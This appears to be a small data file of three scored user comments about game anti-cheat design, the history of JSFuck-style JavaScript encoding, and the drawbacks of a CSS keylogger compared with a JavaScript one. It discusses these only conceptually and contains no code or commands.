"An easy anti cheat to make, is to take the variable, multiply it's value by a random number, and store that number alongside it, each time you read or write that value, you change the random number.
it stops a lot of people from simply using cheat engine and modifying the variable.
if you are communicating with an http server, do use Https and verify the certificate.
also if you are making a single player/local coop game, *don't put an anti cheat in*, but do put an ""assist mode"" or a ""crazy mode"".

if you are using a client-server model, don't trust the client and do the calculations on the server, this is more intensive, but you avoid most cheats.
also, you can try to look for mods/cheats and put players that are cheating in the same matchmaking pool, most cheaters don't mind that.

another way to look at it is to wonder how cheats can and would impact the game,  and put those in in a limited fashion, for example, if people may be looking to slow down or speed up the game, allow it in private lobbies with a 0.5-x4 speed, it might help people not want to cheat.

finally, you can't make a 100% proof anti cheat, so the simplest option is to have players report cheaters, and look at the numbers of complaints a given player gets, then put him in a cheater queue if they get complaints too often.",-0.9952,286

"I had a very similar story that brought me to meet .mario, among other amazing people. In 2016, I published a slidedeck explaining how to encode JavaScript with only six characters, believing to be the first to think about that. This had its small success on the news sites and was published in JS Weekly. It turned out that Martin Kleppe had preceded me with his project JSFuck, and that this idea had already been studied in a book published in 2011 and written by ... Mario Heiderich, Eduardo Albert Vela Nava, Gareth Heyes and David Lindsay. It's a small world ! In the end, I was able to talk with them and join their working group to contribute. I think Mike Gualtieri made the same mistake as me, but if it helps to inform people while getting experts and apprentices to meet each other, then it's a good, innocent mistake.",0.8687,168

"Not quite sure how this CSS keylogger would be advantegeous over an JS Keylogger.
1. It's a lot more work, and a lot less reliable as you, for example, cant detect backspaces.
2. It will generate A LOT more requests in a browser, thus making it a lot easier for console users to detect something fishy going on (Aside of the large amount of requests, just loading this huge list of CSS rules will impact the site loading performance as well, which surely also will be noticed.
